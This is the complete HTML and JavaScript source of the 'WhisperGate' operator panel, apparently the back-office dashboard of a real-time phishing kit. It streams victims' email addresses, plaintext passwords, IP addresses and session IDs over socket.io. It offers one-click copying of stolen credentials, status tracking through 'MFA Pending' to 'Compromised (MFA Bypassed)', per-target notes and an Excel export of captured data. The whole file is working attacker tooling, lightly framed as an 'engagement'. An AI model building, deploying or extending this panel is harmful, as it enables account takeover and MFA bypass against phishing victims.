<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WhisperGate — Operator Panel</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
  <style>
    :root {
      --bg: #0d1117;
      --card: #161b22;
      --border: #30363d;
      --text: #e6edf3;
      --text-dim: #8b949e;
      --accent: #58a6ff;
      --green: #3fb950;
      --orange: #d29922;
      --red: #f85149;
      --purple: #bc8cff;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: "Consolas", "Courier New", monospace; background: var(--bg); color: var(--text); min-height: 100vh; padding: 24px; }

    /* Header */
    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 16px; border-bottom: 1px solid var(--border); }
    .header h1 { font-size: 18px; font-weight: 600; }
    .header h1 span { color: var(--accent); }
    .header-right { display: flex; align-items: center; gap: 16px; }
    .status-dot { display: inline-block; width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-right: 6px; animation: pulse 2s infinite; }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }

    /* Top stats bar */
    .stats-bar { display: flex; gap: 16px; margin-bottom: 20px; flex-wrap: wrap; }
    .stat-card { background: var(--card); border: 1px solid var(--border); border-radius: 6px; padding: 14px 18px; flex: 1; min-width: 140px; }
    .stat-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-dim); margin-bottom: 4px; }
    .stat-value { font-size: 24px; font-weight: 700; }
    .stat-value.accent { color: var(--accent); }
    .stat-value.green { color: var(--green); }
    .stat-value.orange { color: var(--orange); }
    .stat-value.red { color: var(--red); }

    /* Layout */
    .grid { display: grid; grid-template-columns: 1fr 280px; gap: 20px; }

    /* Target cards */
    .targets-area { }
    .targets-empty { background: var(--card); border: 1px solid var(--border); border-radius: 6px; padding: 48px 16px; text-align: center; color: var(--text-dim); font-size: 13px; }
    .target-card { background: var(--card); border: 1px solid var(--border); border-radius: 6px; margin-bottom: 12px; overflow: hidden; animation: slideIn 0.3s ease; }
    @keyframes slideIn { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }

    .tc-header { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; border-bottom: 1px solid var(--border); }
    .tc-email { font-size: 14px; font-weight: 600; color: var(--accent); }
    .tc-meta { font-size: 11px; color: var(--text-dim); }
    .tc-status { display: inline-block; font-size: 10px; font-weight: 600; padding: 2px 8px; border-radius: 3px; text-transform: uppercase; letter-spacing: 0.5px; }
    .status-scanning { background: rgba(139,148,158,0.15); color: var(--text-dim); }
    .status-captured { background: rgba(210,153,34,0.15); color: var(--orange); }
    .status-mfa_pending { background: rgba(188,140,255,0.15); color: var(--purple); }
    .status-compromised { background: rgba(248,81,73,0.15); color: var(--red); }
    .status-released { background: rgba(63,185,80,0.15); color: var(--green); }

    .tc-body { padding: 12px 16px; }
    .tc-creds { margin-bottom: 10px; }
    .tc-cred-row { display: flex; align-items: center; gap: 8px; padding: 6px 0; border-bottom: 1px solid rgba(48,54,61,0.5); font-size: 12px; }
    .tc-cred-row:last-child { border-bottom: none; }
    .tc-cred-pw { flex: 1; }
    .tc-cred-pw code { background: rgba(88,166,255,0.1); padding: 1px 5px; border-radius: 2px; }
    .tc-cred-attempt { font-size: 10px; padding: 1px 5px; border-radius: 2px; }
    .tc-cred-time { font-size: 10px; color: var(--text-dim); }

    .tc-actions { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 10px; }

    .copy-btn { padding: 4px 10px; font-size: 11px; font-weight: 600; font-family: inherit; border-radius: 3px; cursor: pointer; transition: all 0.15s; border: 1px solid var(--border); background: rgba(88,166,255,0.08); color: var(--accent); }
    .copy-btn:hover { background: rgba(88,166,255,0.18); }
    .copy-btn.copied { background: rgba(63,185,80,0.15); color: var(--green); border-color: var(--green); }

    .action-btn { padding: 5px 12px; font-size: 11px; font-weight: 600; font-family: inherit; border-radius: 3px; cursor: pointer; transition: all 0.15s; border: 1px solid; }
    .btn-compromised { background: rgba(248,81,73,0.08); color: var(--red); border-color: var(--red); }
    .btn-compromised:hover { background: rgba(248,81,73,0.18); }
    .btn-release { background: rgba(63,185,80,0.08); color: var(--green); border-color: var(--green); }
    .btn-release:hover { background: rgba(63,185,80,0.18); }
    .btn-disabled { opacity: 0.3; cursor: not-allowed; pointer-events: none; }

    .tc-notes { margin-top: 8px; }
    .tc-notes textarea { width: 100%; min-height: 48px; background: var(--bg); border: 1px solid var(--border); border-radius: 3px; color: var(--text); font-family: inherit; font-size: 11px; padding: 8px; resize: vertical; }
    .tc-notes textarea:focus { outline: none; border-color: var(--accent); }
    .tc-notes-saved { font-size: 10px; color: var(--green); margin-top: 4px; display: none; }
    .tc-timer { font-size: 10px; color: var(--text-dim); margin-top: 4px; }

    /* Sidebar */
    .sidebar { display: flex; flex-direction: column; gap: 12px; }
    .side-card { background: var(--card); border: 1px solid var(--border); border-radius: 6px; padding: 14px; }
    .side-card h3 { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-dim); margin-bottom: 10px; }

    .export-btn { display: block; width: 100%; padding: 10px; font-size: 12px; font-weight: 600; font-family: inherit; border: 1px solid var(--accent); border-radius: 4px; cursor: pointer; background: rgba(88,166,255,0.08); color: var(--accent); transition: all 0.15s; text-align: center; text-decoration: none; }
    .export-btn:hover { background: rgba(88,166,255,0.18); }

    .log-line { font-size: 10px; color: var(--text-dim); padding: 3px 0; border-bottom: 1px solid rgba(48,54,61,0.5); }
    .log-body { max-height: 300px; overflow-y: auto; }

    @media (max-width: 768px) {
      .grid { grid-template-columns: 1fr; }
      .stats-bar { flex-direction: column; }
    }
  </style>
</head>
<body>
  <div class="header">
    <h1><span>WhisperGate</span> Operator Panel</h1>
    <div class="header-right">
      <span><span class="status-dot"></span><span style="font-size:11px;color:var(--text-dim)">Connected</span></span>
    </div>
  </div>

  <div class="stats-bar">
    <div class="stat-card">
      <div class="stat-label">Engagement Timer</div>
      <div class="stat-value accent" id="engTimer">00:00:00</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">Total Targets</div>
      <div class="stat-value accent" id="statTargets">0</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">Creds Captured</div>
      <div class="stat-value orange" id="statCreds">0</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">MFA Bypassed</div>
      <div class="stat-value red" id="statMfa">0</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">Released</div>
      <div class="stat-value green" id="statReleased">0</div>
    </div>
  </div>

  <div class="grid">
    <div class="targets-area" id="targetsArea">
      <div class="targets-empty" id="targetsEmpty">Waiting for targets...</div>
    </div>

    <div class="sidebar">
      <div class="side-card">
        <h3>Export</h3>
        <a class="export-btn" id="exportBtn" href="#">Download Excel Report</a>
      </div>
      <div class="side-card">
        <h3>Event Log</h3>
        <div class="log-body" id="logBody"></div>
      </div>
    </div>
  </div>

  <script>
    var socket = io('/operator');
    var targetData = {};  // sid -> {email, ip, credentials[], status, notes, firstSeen}
    var engagementStart = null;
    var engTimerInterval = null;
    var adminToken = new URLSearchParams(window.location.search).get('token') || '';

    // ── Export link ─────────────────────────────
    document.getElementById('exportBtn').addEventListener('click', function(e) {
      e.preventDefault();
      window.location.href = '/operator/export?token=' + encodeURIComponent(adminToken);
    });

    // ── Engagement timer ────────────────────────
    function startEngTimer(startTime) {
      if (engTimerInterval) return;
      engagementStart = startTime instanceof Date ? startTime : new Date(startTime);
      engTimerInterval = setInterval(function() {
        var diff = Math.floor((Date.now() - engagementStart.getTime()) / 1000);
        var h = String(Math.floor(diff / 3600)).padStart(2, '0');
        var m = String(Math.floor((diff % 3600) / 60)).padStart(2, '0');
        var s = String(diff % 60).padStart(2, '0');
        document.getElementById('engTimer').textContent = h + ':' + m + ':' + s;
      }, 1000);
    }

    // ── Stats update ────────────────────────────
    function updateStats() {
      var keys = Object.keys(targetData);
      var totalTargets = keys.length;
      var totalCreds = 0;
      var totalMfa = 0;
      var totalReleased = 0;
      keys.forEach(function(sid) {
        var t = targetData[sid];
        totalCreds += t.credentials.length;
        if (t.status === 'compromised' || t.status === 'released') totalMfa++;
        if (t.status === 'released') totalReleased++;
      });
      document.getElementById('statTargets').textContent = totalTargets;
      document.getElementById('statCreds').textContent = totalCreds;
      document.getElementById('statMfa').textContent = totalMfa;
      document.getElementById('statReleased').textContent = totalReleased;
    }

    // ── Render target card ──────────────────────
    function renderTarget(sid) {
      var t = targetData[sid];
      if (!t) return;

      document.getElementById('targetsEmpty').style.display = 'none';
      var existing = document.getElementById('tc-' + sid);

      var statusLabels = {
        scanning: 'Scanning', captured: 'Captured', mfa_pending: 'MFA Pending',
        compromised: 'Compromised', released: 'Released'
      };

      // Build credentials list
      var credsHtml = '';
      t.credentials.forEach(function(c, i) {
        credsHtml +=
          '<div class="tc-cred-row">' +
            '<span class="tc-cred-pw">Password: <code>' + esc(c.password) + '</code></span>' +
            '<span class="tc-cred-attempt status-' + (c.attempt === 1 ? 'captured' : 'released') + '" style="font-size:10px;padding:1px 5px;border-radius:2px;">#' + c.attempt + '</span>' +
            '<span class="tc-cred-time">' + esc(c.timestamp) + '</span>' +
            '<button class="copy-btn" onclick="copyToClip(this, \'' + escAttr(c.password) + '\')">Copy</button>' +
          '</div>';
      });

      // Action buttons depend on status
      var actionsHtml = '';
      if (t.email) {
        actionsHtml += '<button class="copy-btn" onclick="copyToClip(this, \'' + escAttr(t.email) + '\')">Copy Username</button>';
      }
      if (t.credentials.length > 0) {
        var lastCred = t.credentials[t.credentials.length - 1];
        actionsHtml += '<button class="copy-btn" onclick="copyToClip(this, \'' + escAttr(lastCred.password) + '\')">Copy Latest Password</button>';
      }

      if (t.status === 'mfa_pending') {
        actionsHtml += '<button class="action-btn btn-compromised" onclick="markCompromised(\'' + sid + '\')">Mark Compromised (MFA Bypassed)</button>';
      }
      if (t.status !== 'released' && t.status !== 'scanning') {
        actionsHtml += '<button class="action-btn btn-release" onclick="releaseTarget(\'' + sid + '\')">Release Target</button>';
      }
      if (t.status === 'compromised') {
        actionsHtml += '<button class="action-btn btn-release" onclick="releaseTarget(\'' + sid + '\')">Release Target</button>';
      }
      if (t.status === 'released') {
        actionsHtml += '<span style="font-size:11px;color:var(--green);">&#x2705; Released at ' + esc(t.released_at || '') + '</span>';
      }

      var cardHtml =
        '<div class="tc-header">' +
          '<div>' +
            '<span class="tc-email">' + esc(t.email || 'Unknown') + '</span>' +
            '<div class="tc-meta">IP: ' + esc(t.ip || '—') + ' &bull; Session: ' + sid.substring(0, 8) + '</div>' +
          '</div>' +
          '<span class="tc-status status-' + t.status + '">' + (statusLabels[t.status] || t.status) + '</span>' +
        '</div>' +
        '<div class="tc-body">' +
          '<div class="tc-creds">' + credsHtml + '</div>' +
          '<div class="tc-actions">' + actionsHtml + '</div>' +
          '<div class="tc-notes">' +
            '<textarea placeholder="Add notes (MFA bypassed, target behavior, etc.)" onchange="saveNote(\'' + sid + '\', this.value)" id="notes-' + sid + '">' + esc(t.notes || '') + '</textarea>' +
            '<div class="tc-notes-saved" id="saved-' + sid + '">Saved</div>' +
          '</div>' +
          '<div class="tc-timer" id="timer-' + sid + '"></div>' +
        '</div>';

      if (existing) {
        existing.innerHTML = cardHtml;
      } else {
        var card = document.createElement('div');
        card.className = 'target-card';
        card.id = 'tc-' + sid;
        card.innerHTML = cardHtml;
        document.getElementById('targetsArea').insertBefore(card, document.getElementById('targetsArea').firstChild);
      }

      updateTargetTimer(sid);
      updateStats();
    }

    // ── Per-target timer ────────────────────────
    function updateTargetTimer(sid) {
      var t = targetData[sid];
      if (!t || !t.credentials.length) return;
      var el = document.getElementById('timer-' + sid);
      if (!el) return;
      var first = new Date(t.credentials[0].timestamp.replace(' ', 'T'));
      var diff = Math.floor((Date.now() - first.getTime()) / 1000);
      var m = Math.floor(diff / 60);
      var s = diff % 60;
      el.textContent = 'Time since first capture: ' + m + 'm ' + s + 's';
    }
    setInterval(function() {
      Object.keys(targetData).forEach(updateTargetTimer);
    }, 1000);

    // ── Log ─────────────────────────────────────
    function addLog(msg) {
      var el = document.getElementById('logBody');
      var d = document.createElement('div');
      d.className = 'log-line';
      d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
      el.insertBefore(d, el.firstChild);
    }

    // ── Socket events ───────────────────────────
    socket.on('connect', function() {
      addLog('Connected to server');
      // Load existing targets
      fetch('/operator/targets?token=' + encodeURIComponent(adminToken))
        .then(function(r) { return r.json(); })
        .then(function(data) {
          if (data.engagement_start) {
            startEngTimer(data.engagement_start);
          }
          (data.targets || []).forEach(function(t) {
            targetData[t.sid] = {
              email: t.email,
              ip: t.ip,
              credentials: t.credentials || [],
              status: t.status,
              notes: t.notes || '',
              released_at: t.released_at,
              firstSeen: t.first_seen
            };
            if (t.credentials && t.credentials.length > 0) {
              renderTarget(t.sid);
            }
          });
          updateStats();
        });
    });

    socket.on('credential', function(data) {
      if (!engagementStart) startEngTimer(new Date());

      var sid = data.sid;
      if (!targetData[sid]) {
        targetData[sid] = {
          email: data.email,
          ip: data.ip,
          credentials: [],
          status: data.status || 'captured',
          notes: '',
          released_at: null,
          firstSeen: data.timestamp
        };
      }
      targetData[sid].email = data.email;
      targetData[sid].ip = data.ip;
      targetData[sid].status = data.status || targetData[sid].status;
      targetData[sid].credentials.push({
        password: data.password,
        attempt: data.attempt,
        timestamp: data.timestamp
      });

      renderTarget(sid);
      addLog('Credential: ' + data.email + ' (attempt #' + data.attempt + ')');
    });

    socket.on('status_update', function(data) {
      var sid = data.sid;
      if (targetData[sid]) {
        targetData[sid].status = data.status;
        if (data.released_at) targetData[sid].released_at = data.released_at;
        renderTarget(sid);
        addLog('Status → ' + data.status + ': ' + (targetData[sid].email || sid));
      }
    });

    // ── Actions ─────────────────────────────────
    function releaseTarget(sid) {
      socket.emit('release_target', { sid: sid });
      addLog('Releasing: ' + (targetData[sid] ? targetData[sid].email : sid));
    }

    function markCompromised(sid) {
      socket.emit('mark_compromised', { sid: sid });
      addLog('MFA bypassed: ' + (targetData[sid] ? targetData[sid].email : sid));
    }

    function saveNote(sid, note) {
      targetData[sid].notes = note;
      fetch('/operator/note?token=' + encodeURIComponent(adminToken), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sid: sid, note: note })
      }).then(function() {
        var el = document.getElementById('saved-' + sid);
        if (el) { el.style.display = 'block'; setTimeout(function() { el.style.display = 'none'; }, 1500); }
      });
    }

    function copyToClip(btn, text) {
      navigator.clipboard.writeText(text).then(function() {
        var orig = btn.textContent;
        btn.textContent = 'Copied!';
        btn.classList.add('copied');
        setTimeout(function() {
          btn.textContent = orig;
          btn.classList.remove('copied');
        }, 1500);
      });
    }

    function esc(s) {
      if (!s) return '';
      var d = document.createElement('div');
      d.textContent = s;
      return d.innerHTML;
    }

    function escAttr(s) {
      return esc(s).replace(/'/g, "\\'").replace(/"/g, '&quot;');
    }
  </script>
</body>
</html>
